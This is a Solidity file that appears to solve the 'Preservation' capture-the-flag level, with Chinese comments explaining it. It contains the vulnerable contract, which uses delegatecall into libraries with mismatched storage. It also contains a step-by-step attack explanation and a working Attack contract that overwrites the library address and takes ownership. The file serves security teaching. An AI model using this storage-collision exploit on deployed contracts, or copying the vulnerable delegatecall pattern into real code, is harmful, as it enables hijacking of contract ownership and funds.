// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 该合约利用库合约保存 2 个不同时区的时间戳。合约的构造函数输入两个库合约地址用于保存不同时区的时间戳。
 * 通关条件：尝试取得合约的所有权（owner）。
 * 注意点：
 * 1.深入了解 Solidity 官网文档中底层方法 delegatecall 的工作原理，它如何在链上和库合约中的使用该方法，以及执行的上下文范围。
 * 2.理解 delegatecall 的上下文保留的含义
 * 3.理解合约中的变量是如何存储和访问的
 * 4.理解不同类型之间的如何转换
 */
contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

/**
 * 攻击思路：
 * 由前面学习可知，delegatecall有安全隐患，使用时要保证《当前合约》和《目标合约》的《状态变量存储结构》相同，
 * 而Preservation和LibraryContract的《状态变量存储结构》不同
 * LibraryContract的storedTime对应Preservation的timeZone1Library
 * 因此可以通过直接调用setFirstTime方法将timeZone1Library指向攻击合约
 * 然后再次调用setFirstTime方法，此时delegatecall就是攻击合约的setTime方法了，可以乘机将owner指向玩家（这里第一次调用是out of gas了）
 */
contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }

    // 将当前合约地址转换为uint256
    function addressToUint256() public view returns(uint256) {
        return uint256(uint160(address(this)));
    }
}
